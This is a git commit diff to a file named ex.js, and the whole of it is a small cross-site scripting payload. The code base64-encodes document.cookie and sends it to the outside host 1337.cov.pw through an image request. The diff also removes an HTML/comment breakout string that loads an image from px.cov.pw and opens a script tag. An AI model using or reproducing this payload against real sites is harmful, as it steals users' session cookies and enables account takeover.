f29076289b0323340dcc0c712ce98f055a4ede36
aza <555365+sudoaza@users.noreply.github.com>
2022-10-26 20:35:55 +0200

    Update ex.js

--- ex.js
+++ ex.js
@@ -1,7 +1,3 @@
- /* " -->' --><img src=//px.cov.pw/ /><script> */
- 
- var cc='//1337.cov.pw/';
+  var cc='//1337.cov.pw/';
  function X(d){new Image().src=cc+btoa(d)};
  X(document.cookie);
- 
- /* // --></script> */
